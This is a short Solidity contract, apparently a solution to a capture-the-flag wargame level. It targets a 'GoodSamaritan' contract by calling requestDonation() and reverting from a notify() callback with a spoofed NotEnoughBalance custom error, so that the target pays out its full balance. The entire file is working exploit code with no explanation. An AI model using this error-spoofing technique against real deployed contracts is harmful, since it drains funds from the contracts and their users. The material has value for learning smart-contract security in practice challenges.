// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract BadSamaritan {
    error NotEnoughBalance();
    function notify(uint256 amount_) external {
        if(amount_ == 10) revert NotEnoughBalance();
    }

    function exploit(address target) external {
        IGoodSamaritan(target).requestDonation();
    }
}

interface IGoodSamaritan {
    function requestDonation() external;
}